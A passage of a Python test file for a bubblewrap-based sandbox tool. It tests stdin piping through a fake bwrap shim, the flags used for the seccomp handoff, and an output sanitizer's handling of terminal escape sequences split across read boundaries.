    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        command = ["/bin/sh", "-c", "cat; echo DONE"]
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        pipe_r, pipe_w = os.pipe()
        out = io.StringIO()
        saved_stdin = sys.stdin
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            sys.stdin = open(pipe_r, "rb", closefd=False)
            with contextlib.redirect_stdout(out):
                os.write(pipe_w, b"hello pipe\n")
                os.close(pipe_w)  # EOF: the pump turns this into the pty VEOF
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            sys.stdin.close()
            sys.stdin = saved_stdin
            os.close(pipe_r)
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        assert out.getvalue() == "hello pipe\r\nDONE\r\n", repr(out.getvalue())


def test_run_sandbox_seccomp_fd_end_to_end():
    """The fail-closed seccomp handoff without real namespaces: a fake
    bwrap (skips its flags, execs the payload) still exercises the real
    run_sandbox path — filter compiled, pipe written, --add-seccomp-fd
    plus --disable-userns in the argv, pin fds passed via pass_fds and
    closed after the spawn, payload exit code propagated. A REAL bwrap
    additionally applies the filter (tests/test_seccomp.py probes that
    end to end)."""
    import contextlib
    import io
    import signal
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        log = os.path.join(tmp, "argv.log")
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\n'
                     'for a in "$@"; do [ "$a" = "--" ] && break; '
                     'printf "%s\\n" "$a"; done >"$SBWRAP_ARGV_LOG"\n'
                     'while [ "$1" != "--" ]; do shift; done\n'
                     'shift\n'
                     'exec "$@"\n')
        os.chmod(shim, 0o755)
        opts = argparse.Namespace(
            net=True, home=False, gui=False, ssh_agent=False, ro_cwd=False,
            bind=[tmp], ro_bind=[], bind_socket=[],
            no_seccomp=False, verbose=False, filter_output=False,
            _bwrap_caps={"seccomp": "--add-seccomp-fd", "disable_userns": True,
                         "bind_fd": True})
        command = ["/bin/sh", "-c", "exit 7"]
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        errbuf = io.StringIO()
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            os.environ["SBWRAP_ARGV_LOG"] = log
            with contextlib.redirect_stderr(errbuf):
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            os.environ["PATH"] = saved_path
            del os.environ["SBWRAP_ARGV_LOG"]
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 7, rc
        argv = open(log, encoding="utf-8").read().splitlines()
        assert argv[0] == "--add-seccomp-fd", argv  # hardening leads the argv
        assert argv[1].isdigit(), argv              # the pipe fd number
        assert "--disable-userns" in argv and "--assert-userns-disabled" in argv, argv
        assert "--bind-fd" in argv, argv            # the user bind, pinned


def test_sanitizer_boundary_equivalence():
    """Chunked delivery must filter identically to one-shot: the spec's
    load-bearing reason is read() boundaries, so every possible split
    point (and a few random multi-splits) is checked against the
    whole-stream result — in default AND strict_cr mode (strict \r
    handling holds a byte of lookahead, which must not leak state that a
    one-shot feed would not have)."""
    import random
    data = (b"A\x1b[31mB\x1b[0m C\x1b]0;t\x07D\x1b[8mE\xe4\xb8\xadF\x1b[2JG"
            b"\x1bP1;2q\x1b\\H\x1bM I\x1b[99999999999999999999999999999999m"
            b"J\x1b]8;;u\x1b\\K\n\r\t\x1b(BL\rM\r\r\nN\r")
    for strict in (False, True):
        one = sbox.OutputSanitizer(strict_cr=strict).feed(data)
        if not strict:
            assert one.endswith("L\rM\r\r\nN\r")  # default keeps bare \r
        else:
            assert one.endswith("LM\r\nN")        # strict drops them
        for cut in range(1, len(data)):
            s = sbox.OutputSanitizer(strict_cr=strict)
            assert s.feed(data[:cut]) + s.feed(data[cut:]) == one, (strict, cut)
        random.seed(1234)  # deterministic multi-split fuzz
        for _ in range(50):
            s, pos, out = sbox.OutputSanitizer(strict_cr=strict), 0, ""
            while pos < len(data):
                step = random.randint(1, 7)
                out += s.feed(data[pos:pos + step])
                pos += step
            assert out == one, strict


def _main():
    import traceback
    tests = [(n, f) for n, f in sorted(globals().items())
             if n.startswith("test_") and callable(f)]
    failed = skipped = 0
    for name, fn in tests:
        try:
            fn()
        except unittest.SkipTest as e:
            skipped += 1
            print(f"SKIP  {name}: {e}")
        except SystemExit as e:
            failed += 1
            print(f"FAIL  {name}: unexpected die()/exit({e.code}) escaped the test")
        except Exception:
            failed += 1
            print(f"FAIL  {name}")
            traceback.print_exc()
        else:
            print(f"PASS  {name}")
    total = len(tests)
    print(f"\n{total} tests: {total - failed - skipped} passed, "
          f"{skipped} skipped, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(_main())
